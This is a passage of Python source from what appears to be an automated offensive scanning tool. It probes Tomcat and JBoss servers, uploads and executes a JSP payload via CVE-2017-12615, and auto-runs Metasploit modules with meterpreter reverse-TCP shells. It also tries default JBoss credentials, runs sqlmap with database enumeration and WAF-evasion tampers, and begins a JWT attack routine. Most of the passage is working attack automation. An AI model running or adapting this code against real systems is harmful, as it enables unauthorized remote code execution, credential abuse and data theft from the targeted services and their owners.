        allow_headers = [line.strip() for line in out.splitlines() if line.lower().startswith("allow:")]
        if allow_headers:
            allow_text = "\n".join(allow_headers)
            tomcat_results.append(f"## OPTIONS {target_url}/\n{allow_text}\n")
            if any("put" in header.lower() for header in allow_headers):
                put_allowed_targets.append(target_url)
                log("crit", f"PUT method ALLOWED on {target_url}/ — CVE-2017-12615 candidate!")

        should_attempt_put = target_url in tomcat_targets or target_url in put_allowed_targets
        if not should_attempt_put:
            tomcat_results.append(f"## PUT {target_url}/{test_jsp}\nSKIPPED (no Tomcat marker and no PUT method advertised)\n")
            continue

        # Test 2: Attempt PUT upload (Tomcat 5.x/7.x with DefaultServlet readonly=false)
        _, put_out = run_cmd_args(
            [
                "curl", "-sk", "-m", "5", "-X", "PUT",
                f"{target_url}/{test_jsp}",
                "-H", "Content-Type: application/octet-stream",
                "--data-binary", f"@{jsp_payload_path}",
                "-w", "\n%{http_code}",
            ],
            timeout=15,
        )
        tomcat_results.append(f"## PUT {target_url}/{test_jsp}\n{put_out.strip()}\n")
        status = put_out.strip().splitlines()[-1] if put_out.strip() else ""

        if status in ("201", "204"):
            put_upload_targets.append(target_url)
            log("crit", f"CVE-2017-12615: PUT 201/204 on {target_url}/{test_jsp} — UPLOAD ACCEPTED!")
            # Test 3: Execute the uploaded JSP
            _, exec_out = run_cmd_args(
                ["curl", "-sk", "-m", "5", f"{target_url}/{test_jsp}"],
                timeout=10,
            )
            tomcat_results.append(f"## GET (exec) {target_url}/{test_jsp}\n{exec_out[:500]}\n")
            if "CVE-2017-12615-CONFIRMED" in exec_out or "uid=" in exec_out:
                rce_confirmed_targets.append(target_url)
                log("crit", f"RCE CONFIRMED on {target_url} via CVE-2017-12615!")
                safe_t = target_url.replace("://", "_").replace("/", "_").replace(":", "_")
                with open(os.path.join(rce_dir, f"RCE_CONFIRMED_CVE-2017-12615_{safe_t}.txt"), "w") as f:
                    f.write(f"TARGET: {target_url}\nCVE: CVE-2017-12615\nEVIDENCE:\n{exec_out}\n")
                # Auto-run Metasploit for Tomcat AJP / PUT RCE
                proto_t = "true" if target_url.startswith("https") else "false"
                port_t  = "443" if target_url.startswith("https") else "80"
                host_t  = target_url.replace("https://","").replace("http://","").rstrip("/")
                rc_tomcat = os.path.join(rce_dir, f"msf_tomcat_{safe_t}.rc")
                with open(rc_tomcat, "w") as f:
                    f.write(f"""use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS {host_t}
set RPORT {port_t}
set SSL {proto_t}
set LHOST YOUR_IP
set LPORT 4447
set PAYLOAD java/meterpreter/reverse_tcp
exploit
""")
                run_msf(rc_tomcat, label="CVE-2017-12615 Tomcat PUT")
            # Clean up uploaded file
            run_cmd_args(["curl", "-sk", "-m", "5", "-X", "DELETE", f"{target_url}/{test_jsp}"], timeout=5)
        elif status == "403":
            tomcat_results.append(f"  → 403 (readonly=true or auth required — Tomcat DefaultServlet protected)\n")
        elif status == "405":
            tomcat_results.append(f"  → 405 Method Not Allowed\n")
        elif status:
            tomcat_results.append(f"  → HTTP {status}\n")

    with open(tomcat_rce_out, "w") as f:
        f.write("\n".join(tomcat_results))
    log("ok", f"Tomcat PUT RCE results → {tomcat_rce_out}")

    # ── Step 5: JBoss admin console exposure ─────────────────────────────────────
    jboss_probe_out = os.path.join(rce_dir, "jboss_admin.txt")
    jboss_results   = [f"# JBoss Admin Console Exposure — {domain}\n"]

    # Probe all Java targets (not just detected JBoss — many show JBoss default page
    # without flagging the tech header)
    jboss_probe_targets = list(dict.fromkeys(jboss_targets if jboss_targets else java_targets[:10]))[:20]

    jboss_paths = [
        "/jmx-console/",
        "/jmx-console/HtmlAdaptor",
        "/web-console/",
        "/web-console/ServerInfo.jsp",
        "/admin-console/",
        "/invoker/JMXInvokerServlet",
        "/invoker/EJBInvokerServlet",
        "/management/",
        "/console/",
        "/ha-console/",
    ]

    jboss_block_terms = (
        "unauthorized activity has been detected",
        "unauthorized request blocked",
        "access denied",
        "request blocked",
        "forbidden",
        "web application firewall",
    )

    for target_url in jboss_probe_targets[:20]:
        for path in jboss_paths:
            _, out = run_cmd_args(
                ["curl", "-sk", "-m", "5", "-w", "\n%{http_code}", f"{target_url.rstrip('/')}{path}"],
                timeout=10,
            )
            lines = out.strip().splitlines()
            status = lines[-1] if lines else "000"
            body   = "\n".join(lines[:-1])[:200] if len(lines) > 1 else ""

            if status in ("200", "302", "301"):
                jboss_results.append(f"[{status}] {target_url}{path}")
                # Check for unauthenticated JMX console
                if status == "200" and any(kw in body.lower() for kw in ("jmx", "mbean", "server info", "jboss", "wildfly", "operation")):
                    jboss_exposed_targets.append(f"{target_url}{path}")
                    log("crit", f"JBoss admin EXPOSED (unauth): {target_url}{path}")
                    jboss_results.append(f"  → EXPOSED: {body[:150]}")
                    # Write confirmed finding + auto-run MSF
                    safe = target_url.replace("://", "_").replace("/", "_").replace(":", "_")
                    with open(os.path.join(rce_dir, f"JBOSS_EXPOSED_{safe}.txt"), "w") as f:
                        f.write(f"TARGET: {target_url}{path}\nSTATUS: {status}\nEVIDENCE:\n{body}\n")
                    proto_j = "true" if target_url.startswith("https") else "false"
                    port_j  = "443" if target_url.startswith("https") else "80"
                    host_j  = target_url.replace("https://","").replace("http://","").rstrip("/")
                    rc_jboss = os.path.join(rce_dir, f"msf_jboss_{safe}.rc")
                    with open(rc_jboss, "w") as fh:
                        fh.write(f"""use exploit/multi/http/jboss_maindeployer
set RHOSTS {host_j}
set RPORT {port_j}
set SSL {proto_j}
set LHOST YOUR_IP
set LPORT 4448
set PAYLOAD java/meterpreter/reverse_tcp
exploit
""")
                    run_msf(rc_jboss, label="JBoss MainDeployer")
                elif status == "200" and any(term in body.lower() for term in jboss_block_terms):
                    jboss_results.append(f"  → BLOCKED/WAF: {body[:80]}")
                elif status == "200":
                    jboss_results.append(f"  → 200 without JBoss markers: {body[:80]}")
            elif status == "401":
                jboss_results.append(f"[401] {target_url}{path} — auth required (try default creds)")
                # Test default credentials: admin:admin, admin:password, admin:jboss
                for cred in ("admin:admin", "admin:password", "admin:jboss", "jboss:jboss"):
                    _, out = run_cmd_args(
                        [
                            "curl", "-sk", "-m", "5",
                            "-u", cred,
                            "-w", "\n%{http_code}",
                            f"{target_url.rstrip('/')}{path}",
                        ],
                        timeout=8,
                    )
                    lines = out.strip().splitlines()
                    cred_status = lines[-1] if lines else "000"
                    if cred_status == "200":
                        jboss_default_cred_targets.append(f"{target_url}{path}")
                        log("crit", f"JBoss DEFAULT CREDS WORK: {target_url}{path} — {cred}")
                        jboss_results.append(f"  → DEFAULT CREDS: {cred} at {target_url}{path}")
                        safe = target_url.replace("://", "_").replace("/", "_").replace(":", "_")
                        with open(os.path.join(rce_dir, f"JBOSS_DEFAULTCREDS_{safe}.txt"), "w") as f:
                            f.write(f"TARGET: {target_url}{path}\nCREDS: {cred}\nSTATUS: 200\n")
                        break

    with open(jboss_probe_out, "w") as f:
        f.write("\n".join(jboss_results))
    log("ok", f"JBoss admin probe results → {jboss_probe_out}")

    # ── Step 6: Summary ──────────────────────────────────────────────────────────
    summary_lines = [
        f"Target domain: {domain}",
        f"Java targets: {len(java_targets)}",
        f"Tomcat targets: {len(tomcat_targets)}",
        f"JBoss targets: {len(jboss_targets)}",
        f"Confirmed RCE: {len(rce_confirmed_targets)}",
        f"JBoss exposed consoles: {len(jboss_exposed_targets)}",
        f"JBoss default-creds hits: {len(jboss_default_cred_targets)}",
        f"Tomcat PUT-allowed hosts: {len(put_allowed_targets)}",
        f"Tomcat PUT upload-accepted hosts: {len(put_upload_targets)}",
        f"Log4Shell OOB callbacks: {_line_count(interactsh_log) if os.path.isfile(interactsh_log) else 0}",
        f"Nuclei RCE hits: {_line_count(nuclei_rce_out) if os.path.isfile(nuclei_rce_out) else 0}",
        f"Nuclei Tomcat/JBoss CVE hits: {_line_count(nuclei_tomcat_out) if os.path.isfile(nuclei_tomcat_out) else 0}",
    ]
    if put_allowed_targets:
        summary_lines.append("Tomcat PUT candidates: " + ", ".join(put_allowed_targets[:5]))
    if put_upload_targets:
        summary_lines.append("Tomcat upload-accepted hosts: " + ", ".join(put_upload_targets[:5]))
    if rce_confirmed_targets:
        summary_lines.append("Confirmed RCE targets: " + ", ".join(rce_confirmed_targets[:5]))
    if jboss_exposed_targets:
        summary_lines.append("JBoss exposed targets: " + ", ".join(jboss_exposed_targets[:5]))
    if jboss_default_cred_targets:
        summary_lines.append("JBoss default-cred targets: " + ", ".join(jboss_default_cred_targets[:5]))
    with open(os.path.join(rce_dir, "summary.txt"), "w") as handle:
        handle.write("\n".join(summary_lines) + "\n")

    if rce_confirmed_targets:
        log("crit", f"RCE CONFIRMED: {len(rce_confirmed_targets)} target(s) → {rce_dir}/")
        for target in rce_confirmed_targets:
            log("crit", f"  {target}")
    else:
        log("info", f"RCE scan complete — no confirmed RCE (review {rce_dir}/ manually)")
        if put_allowed_targets:
            log("warn", f"Tomcat PUT candidates: {', '.join(put_allowed_targets[:5])}")
        if jboss_exposed_targets:
            log("warn", f"JBoss consoles exposed (not confirmed RCE): {', '.join(jboss_exposed_targets[:5])}")
        if jboss_default_cred_targets:
            log("warn", f"JBoss default-cred exposures (not confirmed RCE): {', '.join(jboss_default_cred_targets[:5])}")

    _brain_phase_complete(
        "RCE SCAN",
        True,
        detail=(
            f"target={domain} java_targets={len(java_targets)} tomcat_targets={len(tomcat_targets)} "
            f"jboss_targets={len(jboss_targets)} confirmed_rce={len(rce_confirmed_targets)} "
            f"put_candidates={len(put_allowed_targets)} jboss_exposed={len(jboss_exposed_targets)} "
            f"jboss_default_creds={len(jboss_default_cred_targets)} "
            f"top_hosts={','.join((rce_confirmed_targets or put_allowed_targets or jboss_exposed_targets or jboss_default_cred_targets)[:3]) or 'none'}"
        ),
        artifacts={"rce": rce_dir},
    )
    return True


# ── NEW: sqlmap targeted scan ───────────────────────────────────────────────────
def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
    """
    Run sqlmap on SQLi candidates from nuclei findings and parameterized URLs.
    """
    log("phase", f"SQLMAP: {domain}")
    recon_dir    = _resolve_recon_dir(domain)
    findings_dir = _resolve_findings_dir(domain, create=True)
    sqli_dir     = os.path.join(findings_dir, "sqlmap")
    os.makedirs(sqli_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("SQLMAP", f"target={domain}")

    if not _which("sqlmap"):
        log("warn", "sqlmap not installed — brew install sqlmap")
        _brain_phase_complete("SQLMAP", False, detail=f"target={domain} sqlmap unavailable")
        return False

    post_params_file = os.path.join(recon_dir, "params", "post_params.json")
    if not os.path.isfile(post_params_file):
        log("info", "sqlmap preflight: discovering POST parameters first (lightpanda + arjun)...")
        run_post_param_discovery(domain, cookies=cookies)

    # Collect candidates: nuclei SQLi findings + parameterized URLs
    candidates = []

    # From nuclei findings
    for fname in ("nuclei_sqli.txt", "nuclei_findings.txt", "nuclei_full.txt"):
        fpath = os.path.join(findings_dir, fname)
        if not os.path.isfile(fpath):
            fpath = os.path.join(recon_dir, "findings", fname)
        if os.path.isfile(fpath):
            for line in open(fpath):
                line = line.strip()
                if "sqli" in line.lower() or "sql" in line.lower():
                    parts = line.split()
                    for p in parts:
                        if p.startswith("http") and "?" in p:
                            candidates.append(p)

    # From paramspider output
    ps_file = os.path.join(recon_dir, "params", "paramspider.txt")
    if os.path.isfile(ps_file):
        for line in open(ps_file):
            u = line.strip()
            if u.startswith("http") and "=" in u:
                candidates.append(u)

    # From recon parameterized URLs (critical fallback when live probing misses http-only hosts).
    # v7.1.4: ``filter_payloads=True`` drops URLs whose query already contains an XSS/SQLi
    # PoC left behind by dalfox/gau crawls — those waste sqlmap cycles.
    with_params_file = os.path.join(recon_dir, "urls", "with_params.txt")
    candidates.extend(_collect_urls_from_file(with_params_file, require_query=True,
                                              limit=50, filter_payloads=True))

    # From arjun output
    arjun_file = os.path.join(recon_dir, "params", "arjun.json")
    if os.path.isfile(arjun_file):
        try:
            data = json.load(open(arjun_file))
            for url, info in data.items():
                params = info.get("params", [])
                if params:
                    candidates.append(f"{url}?{'&'.join(p+'=test' for p in params[:3])}")
        except Exception:
            pass

    candidates = [c for c in dict.fromkeys(candidates) if not _looks_like_payload_url(c)]
    candidates = candidates[:20]  # top 20 GET candidates

    # v7.1.4 — OpenAPI/Swagger POST endpoints from api_audit.py Phase 6.5.
    # These don't go through ``sqlmap -m`` (which treats one URL per line as GET);
    # each POST endpoint is sqlmap'd individually with --data + --method POST so
    # request-body parameters get fuzzed properly.
    openapi_posts = _collect_openapi_post_endpoints(recon_dir, limit=15)
    if openapi_posts:
        log("info", f"sqlmap: {len(openapi_posts)} POST candidate(s) from OpenAPI specs")

    if not candidates and not openapi_posts:
        log("warn", "No SQLi candidates found — run recon + param discovery first")
        return False

    # v7.1.4 — thread session cookies into sqlmap so authenticated endpoints
    # don't 302 back to the login page before sqlmap can probe them.
    cookie_opt = f'--cookie="{cookies}"' if cookies else ""

    sqli_out = os.path.join(sqli_dir, "sqlmap_results.txt")

    if candidates:
        log("info", f"sqlmap: testing {len(candidates)} GET candidate URL(s)...")
        cand_file = os.path.join(sqli_dir, "candidates.txt")
        with open(cand_file, "w") as f:
            f.write("\n".join(candidates))

        ok, out = run_cmd(
            f'sqlmap -m "{cand_file}" --batch --level=3 --risk=2 '
            f'--output-dir="{sqli_dir}" --results-file="{sqli_out}" '
            f'--random-agent --timeout=10 {cookie_opt}',
            timeout=1800,
            watch_file=sqli_dir,
            watch_phase="SQLMAP"
        )
        print(out[-3000:] if len(out) > 3000 else out)
    else:
        ok = True
        out = ""

    # v7.1.4 — run each OpenAPI POST operation with its synthesised JSON body.
    # The original candidate aggregator missed these entirely, which is how
    # the testfire.net SQLi on /api/login escaped detection.
    for op in openapi_posts:
        body = json.dumps(op["json_body"] or {"test": "1"}, separators=(",", ":"))
        safe_name = (op["url"].replace("https://", "").replace("http://", "")
                      .replace("/", "_").replace(":", "_"))[:60]
        out_file = os.path.join(sqli_dir, f"post_{safe_name}.txt")
        log("info", f"sqlmap {op['method']} → {op['url']}  body={body[:80]}")
        ok_p, out_p = run_cmd(
            f'sqlmap -u "{op["url"]}" --data=\'{body}\' '
            f'--method {op["method"]} --batch --level=3 --risk=2 '
            f'--random-agent --timeout=10 {cookie_opt} '
            f'--output-dir="{sqli_dir}" -o "{out_file}"',
            timeout=600,
        )
        if "injectable" in (out_p or "").lower():
            log("crit", f"API SQLi FOUND: {op['method']} {op['url']}")

    if os.path.exists(sqli_out):
        injections = sum(1 for line in open(sqli_out) if "injectable" in line.lower() or "injection" in line.lower())
        if injections:
            log("crit", f"sqlmap: {injections} injectable parameter(s) found → {sqli_dir}")
        else:
            log("ok", f"sqlmap complete → {sqli_dir}")
    else:
        log("ok" if ok else "warn", f"sqlmap complete → {sqli_dir}")

    _brain_phase_complete(
        "SQLMAP",
        ok,
        detail=f"target={domain} candidates={len(candidates)}",
        artifacts={"sqlmap": sqli_dir},
    )
    return True


# ── NEW: sqlmap via raw request file (--request-file) ───────────────────────────
def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                             level: int = 5, risk: int = 3,
                             extra_flags: str = "") -> bool:
    """
    Run sqlmap against a raw Burp-style HTTP request file.
    Usage: hunt.py --request-file req.txt [--target domain]

    The request file format (Burp Suite export / manual):
        POST /path HTTP/1.1
        Host: target.com
        Content-Type: application/x-www-form-urlencoded
        Cookie: JSESSIONID=abc123

        param1=value1&param2=value2

    sqlmap -r is passed the file directly — it reads method, path, headers,
    cookies, and POST body automatically.
    """
    import re as _re

    if not os.path.isfile(req_file):
        log("err", f"Request file not found: {req_file}")
        return False

    log("phase", f"SQLMAP (request-file): {req_file}")

    # ── Parse request file to extract host/domain for output dir ────────────
    host_from_file = domain
    method_from_file = "GET"
    path_from_file = "/"
    has_post_body = False

    try:
        with open(req_file) as fh:
            raw = fh.read()
        lines = raw.split("\n")
        if lines:
            first = lines[0].strip()
            parts = first.split()
            if len(parts) >= 2:
                method_from_file = parts[0].upper()
                path_from_file   = parts[1]
        for ln in lines[1:]:
            if ln.lower().startswith("host:"):
                host_from_file = host_from_file or ln.split(":", 1)[1].strip().split(":")[0]
            if not ln.strip() and not has_post_body:
                # blank line = end of headers; body may follow
                has_post_body = (method_from_file in ("POST", "PUT", "PATCH"))
    except Exception as e:
        log("warn", f"Could not parse request file: {e}")

    effective_domain = domain or host_from_file or "unknown"
    log("info", f"Target: {effective_domain}  {method_from_file} {path_from_file}")

    if not _which("sqlmap"):
        log("warn", "sqlmap not installed — brew install sqlmap")
        return False

    # ── Output directory ─────────────────────────────────────────────────────
    findings_dir = _resolve_findings_dir(effective_domain, create=True)
    sqli_dir     = os.path.join(findings_dir, "sqlmap_reqfile")
    os.makedirs(sqli_dir, exist_ok=True)

    sqli_out  = os.path.join(sqli_dir, "results.txt")
    req_abs   = os.path.abspath(req_file)

    # ── Build sqlmap command ─────────────────────────────────────────────────
    # -r  : read from raw request file (handles method, headers, body)
    # --batch: non-interactive
    # --level 5 / --risk 3: maximum coverage
    # --dbs: enumerate databases on injection
    # --random-agent: rotate UA
    # --tamper=space2comment: basic WAF evasion
    cmd = (
        f'sqlmap -r "{req_abs}" '
        f'--batch --level={level} --risk={risk} '
        f'--dbs --tables --random-agent '
        f'--tamper=space2comment,between '
        f'--output-dir="{sqli_dir}" --results-file="{sqli_out}" '
        f'--timeout=15 --retries=2 '
        f'{extra_flags}'
    )

    log("info", f"Running: {cmd}")
    ok, out = run_cmd(cmd, timeout=2400, watch_file=sqli_dir, watch_phase="SQLMAP-RF")
    print(out[-4000:] if len(out) > 4000 else out)

    # ── Parse results ────────────────────────────────────────────────────────
    injections = 0
    vuln_params: list[str] = []

    if os.path.isfile(sqli_out):
        for ln in open(sqli_out):
            if "injectable" in ln.lower() or "injection" in ln.lower():
                injections += 1
                vuln_params.append(ln.strip())

    # Also scan stdout for "Parameter: X ... injectable"
    param_pat = _re.compile(r"Parameter:\s+(\S+)\s", _re.IGNORECASE)
    for ln in out.splitlines():
        if "injectable" in ln.lower() or "is vulnerable" in ln.lower():
            m = param_pat.search(ln)
            if m:
                vuln_params.append(m.group(0).strip())

    vuln_params = list(dict.fromkeys(vuln_params))  # dedup

    if vuln_params or injections:
        log("crit", f"INJECTABLE: {len(vuln_params or [injections])} parameter(s) → {sqli_dir}")
        for vp in vuln_params[:5]:
            log("crit", f"  ↳ {vp}")
        # Write finding summary
        summary_f = os.path.join(sqli_dir, "INJECTABLE_PARAMS.txt")
        with open(summary_f, "w") as sf:
            sf.write(f"Target:  {effective_domain}\n")
            sf.write(f"Method:  {method_from_file}\n")
            sf.write(f"Path:    {path_from_file}\n")
            sf.write(f"Request: {req_abs}\n\n")
            sf.write("INJECTABLE PARAMETERS:\n")
            sf.write("\n".join(vuln_params) + "\n")
        log("crit", f"Summary → {summary_f}")
    else:
        log("ok", f"sqlmap (request-file) complete — no injections detected → {sqli_dir}")

    if _brain and _brain.enabled:
        _brain_phase_complete(
            "SQLMAP-RF",
            ok,
            detail=f"target={effective_domain} method={method_from_file} "
                   f"path={path_from_file} injections={injections}",
            artifacts={"sqlmap_reqfile": sqli_dir},
        )

    return bool(vuln_params or injections)


# ── POST-aware katana crawl + arjun POST param discovery ────────────────────────
def run_post_param_discovery(domain: str,
                              cookies: str = "",
                              headers: dict | None = None,
                              session_file: str = "",
                              auto_install_lp: bool = True) -> bool:
    """
    Discover POST endpoints and their parameters — the gap that gau/wayback miss.

    Priority tool chain:
    1. lightpanda fetch (JS-rendered HTML) → parse all <form> elements with real input names
       Falls back to plain HTTP GET if lightpanda not installed (auto-install attempted).
    2. arjun --method POST on each live host → brute-forces hidden POST param names
    3. Writes post_params.json + post_urls.txt to recon/params/
    4. sqlmap --data on each POST endpoint with discovered params

    Why lightpanda > katana for forms:
    - Executes JavaScript before dumping HTML → catches dynamically-injected forms (JSP, React)
    - Sees forms that require JS to render (single-page apps, Spring MVC, etc.)
    - katana -form-extraction is passive/shallow and misses JS-rendered forms entirely
    """
    import json as _json
    import urllib.parse

    log("phase", f"POST PARAM DISCOVERY: {domain}")
    recon_dir  = _resolve_recon_dir(domain)
    params_dir = os.path.join(recon_dir, "params")
    os.makedirs(params_dir, exist_ok=True)

    if _brain and _brain.enabled:
        _brain.phase_start("POST-PARAMS", f"target={domain}")

    # ── Resolve live hosts ────────────────────────────────────────────────────
    live_file = os.path.join(recon_dir, "live", "urls.txt")
    legacy_live_file = os.path.join(recon_dir, "urls", "live_hosts.txt")
    if not os.path.isfile(live_file):
        live_file = legacy_live_file

    def _looks_form_page(url: str) -> bool:
        parsed = urlsplit(url)
        lower = url.lower()
        path = (parsed.path or "").lower()
        static_suffixes = (
            ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
            ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".zip", ".gz",
            ".tar", ".tgz", ".mp4", ".webm", ".json", ".xml",
        )
        if path.endswith(static_suffixes):
            return False
        return (
            lower.endswith("/")
            or any(token in lower for token in (
                ".jsp", ".jspx", ".php", ".asp", ".aspx", ".do", ".action", ".html", ".htm",
            ))
        )

    def _seed_score(url: str, source_tag: str) -> tuple[int, int]:
        lower = url.lower()
        score = 0
        if source_tag == "live":
            score += 40
        elif source_tag == "top":
            score += 30
        elif source_tag == "gau":
            score += 20
        elif source_tag == "wayback":
            score += 15
        elif source_tag == "all":
            score += 10

        if lower.startswith("https://"):
            score += 3
        if "?" in lower:
            score += 2

        high_signal_tokens = (
            "dispatch", "abstract", "report", "form", "entry", "search",
            "login", "submit", "save", "create", "update", "edit", "export",
            "rice", "scm", "dist", "district",
        )
        score += sum(4 for token in high_signal_tokens if token in lower)
        return (-score, len(url))

    seed_candidates: list[tuple[str, str]] = []
    seen_seeds: set[str] = set()
    for source_file in (
        ("live", live_file),
        ("top", os.path.join(params_dir, "top_urls.txt")),
        ("gau", os.path.join(recon_dir, "urls", "gau.txt")),
        ("wayback", os.path.join(recon_dir, "urls", "waybackurls.txt")),
        ("all", os.path.join(recon_dir, "urls", "all.txt")),
    ):
        source_tag, source_path = source_file
        for url in _collect_urls_from_file(source_path, limit=250):
            if not _looks_form_page(url):
                continue
            if url in seen_seeds:
                continue
            seen_seeds.add(url)
            seed_candidates.append((url, source_tag))

    seed_urls = [
        url for url, _ in sorted(
            seed_candidates,
            key=lambda item: _seed_score(item[0], item[1])
        )[:30]
    ]

    if not seed_urls:
        log("warn", "No live or historical HTML pages for POST discovery")
        return False

    post_urls:   list[str] = []
    post_params: dict      = {}   # url → {method: str, params: [str], inputs: [str]}
    forms_raw:   list[dict] = []  # raw parsed forms for logging

    # ── Try to auto-install lightpanda if missing ────────────────────────────
    lp = _lightpanda_bin()
    if not lp and auto_install_lp:
        log("info", "lightpanda not found — attempting auto-install...")
        if _install_lightpanda():
            lp = _lightpanda_bin()

    if lp:
        log("info", f"lightpanda: JS-rendering {min(len(seed_urls), 30)} pages for form extraction")
    else:
        log("warn", "lightpanda unavailable — falling back to plain HTTP form parse (no JS rendering)")

    # ── Step 1: lightpanda form extraction (preferred) ───────────────────────
    lp_forms_file = os.path.join(params_dir, "lightpanda_forms.json")
    all_forms: list[dict] = []   # {page_url, action, method, inputs}

    for host in seed_urls[:30]:
        forms = _lightpanda_fetch_forms(host, cookies=cookies, headers=headers, timeout=20)
        for form in forms:
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])

            # Resolve relative action URLs
            if action and not action.startswith("http"):
                action = urllib.parse.urljoin(host, action)
            if not action:
                action = host

            entry = {
                "page_url": host,
                "action":   action,
                "method":   method,
                "inputs":   inputs,
            }
            all_forms.append(entry)

            if method == "POST" and inputs:
                post_urls.append(action)
                if action not in post_params:
                    post_params[action] = {"method": "POST", "params": inputs, "inputs": inputs}
                else:
                    # merge input names
                    existing = post_params[action]["params"]
                    post_params[action]["params"] = list(dict.fromkeys(existing + inputs))

    # Save all forms (GET + POST) for reference
    with open(lp_forms_file, "w") as ff:
        _json.dump(all_forms, ff, indent=2)

    total_forms = len(all_forms)
    post_forms  = sum(1 for f in all_forms if f["method"] == "POST")
    engine_label = "lightpanda" if lp else "HTTP-fallback"
    log("info", f"{engine_label}: {total_forms} forms found ({post_forms} POST) across {len(seed_urls[:30])} pages")
    log("ok",   f"All forms → {lp_forms_file}")

    # ── Step 2: arjun POST param brute-force ─────────────────────────────────
    # Runs on all live hosts + POST URLs discovered in step 1
    if _which("arjun"):
        arjun_targets = list(dict.fromkeys(seed_urls + post_urls))[:30]
        targets_file  = os.path.join(params_dir, "arjun_post_targets.txt")
        arjun_post_out = os.path.join(params_dir, "arjun_post.json")

        with open(targets_file, "w") as tf:
            tf.write("\n".join(arjun_targets))

        cookie_flag = f'--headers "Cookie: {cookies}"' if cookies else ""
        ok_arjun, out_arjun = run_cmd(
            f'arjun -i "{targets_file}" --method POST --stable '
            f'--rate-limit 5 -t 5 {cookie_flag} '
            f'-oJ "{arjun_post_out}"',
            timeout=600,
        )
        if os.path.isfile(arjun_post_out):
            try:
                data = _json.load(open(arjun_post_out))
                new_from_arjun = 0
                for url, info in data.items():
                    params = info.get("params", [])
                    if params:
                        new_from_arjun += 1
                        post_urls.append(url)
                        if url not in post_params:
                            post_params[url] = {"method": "POST", "params": params, "inputs": params}
                        else:
                            existing = post_params[url]["params"]
                            post_params[url]["params"] = list(dict.fromkeys(existing + params))
                log("info", f"arjun POST: {new_from_arjun} new endpoints with params")
            except Exception as e:
                log("warn", f"arjun POST JSON parse: {e}")
    else:
        log("warn", "arjun not installed — skipping POST param brute-force (pip3 install arjun)")

    if not post_params and not post_urls:
        log("info", "No POST parameters discovered")
        _brain_phase_complete("POST-PARAMS", True, detail=f"target={domain} found=0")
        return False

    # ── Write results ────────────────────────────────────────────────────────
    post_params_file = os.path.join(params_dir, "post_params.json")
    with open(post_params_file, "w") as pf:
        _json.dump(post_params, pf, indent=2)

    post_urls_file = os.path.join(params_dir, "post_urls.txt")
    with open(post_urls_file, "w") as uf:
        uf.write("\n".join(list(dict.fromkeys(post_urls))))

    log("ok",  f"POST endpoints: {len(post_params)} with params → {post_params_file}")

    # Print summary table
    for url, info in list(post_params.items())[:10]:
        params_preview = ", ".join(info["params"][:6])
        if len(info["params"]) > 6:
            params_preview += f" (+{len(info['params'])-6} more)"
        log("info", f"  POST {url}  params=[{params_preview}]")

    # ── Step 3: sqlmap --data on POST candidates ──────────────────────────────
    if _which("sqlmap") and post_params:
        findings_dir  = _resolve_findings_dir(domain, create=True)
        sqli_post_dir = os.path.join(findings_dir, "sqlmap_post")
        os.makedirs(sqli_post_dir, exist_ok=True)
        cookie_opt = f'--cookie="{cookies}"' if cookies else ""

        injectable_count = 0
        for url, info in list(post_params.items())[:10]:  # top 10 endpoints
            params_str = "&".join(f"{p}=1" for p in info["params"][:8])
            safe_name  = (url.replace("https://", "").replace("http://", "")
                             .replace("/", "_").replace(":", "_"))[:60]
            out_file   = os.path.join(sqli_post_dir, f"{safe_name}.txt")

            log("info", f"sqlmap POST → {url}  data={params_str[:80]}")
            ok2, out2 = run_cmd(
                f'sqlmap -u "{url}" --data="{params_str}" '
                f'--method POST --batch --level=3 --risk=2 '
                f'--random-agent --timeout=10 {cookie_opt} '
                f'--output-dir="{sqli_post_dir}" -o "{out_file}"',
                timeout=600,
            )
            if "injectable" in out2.lower() or "injection" in out2.lower():
                log("crit", f"POST SQLi FOUND: {url}  data={params_str}")
                injectable_count += 1

        if injectable_count:
            log("crit", f"Total injectable POST endpoints: {injectable_count} → {sqli_post_dir}")
        else:
            log("ok", f"sqlmap POST scan complete → {sqli_post_dir}")
    else:
        if not _which("sqlmap"):
            log("warn", "sqlmap not installed — skipping POST SQLi check")

    _brain_phase_complete(
        "POST-PARAMS",
        True,
        detail=(f"target={domain} engine={engine_label} "
                f"forms={total_forms} post_endpoints={len(post_params)} "
                f"post_urls={len(post_urls)}"),
        artifacts={"post_params": post_params_file, "lp_forms": lp_forms_file},
    )
    return True


# ── NEW: JWT Audit ──────────────────────────────────────────────────────────────
def run_jwt_audit(domain: str) -> bool:
    """
    Collect JWTs from recon artifacts and run jwt_tool:
    - Algorithm confusion (alg=none, RS256→HS256)
    - Weak secret cracking with wordlist
    - Full claims decode + flag check
    """
    log("phase", f"JWT AUDIT: {domain}")
    recon_dir   = _resolve_recon_dir(domain)
    findings_dir = _resolve_findings_dir(domain, create=True)
    jwt_dir     = os.path.join(findings_dir, "jwt")
    os.makedirs(jwt_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("JWT AUDIT", f"target={domain}")

    jwt_tool_py = _tool_bin("jwt_tool")

    if not os.path.isfile(jwt_tool_py):
        log("warn", f"jwt_tool not found at {jwt_tool_py}")
        log("info", "Install: git clone https://github.com/ticarpi/jwt_tool.git ~/jwt_tool")
        _brain_phase_complete("JWT AUDIT", False, detail=f"target={domain} jwt_tool unavailable")
        return False

    # Collect JWTs from all recon/findings artifacts
    import re
    jwt_pattern = re.compile(r'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})')
    found_jwts  = {}

    search_paths = [
        os.path.join(recon_dir, "live", "httpx_full.txt"),
        os.path.join(findings_dir, "nuclei_findings.txt"),
        os.path.join(recon_dir, "js", "jsluice_secrets.txt"),
        os.path.join(recon_dir, "js", "secretfinder.txt"),
    ]

    for fpath in search_paths:
        if os.path.isfile(fpath):
            for line in open(fpath, errors="ignore"):
                for m in jwt_pattern.finditer(line):
                    tok = m.group(1)
                    if tok not in found_jwts:
                        found_jwts[tok] = fpath

    if not found_jwts:
        log("info", "No JWTs found in recon artifacts")
        return True

    log("info", f"Found {len(found_jwts)} unique JWT(s) — running jwt_tool...")

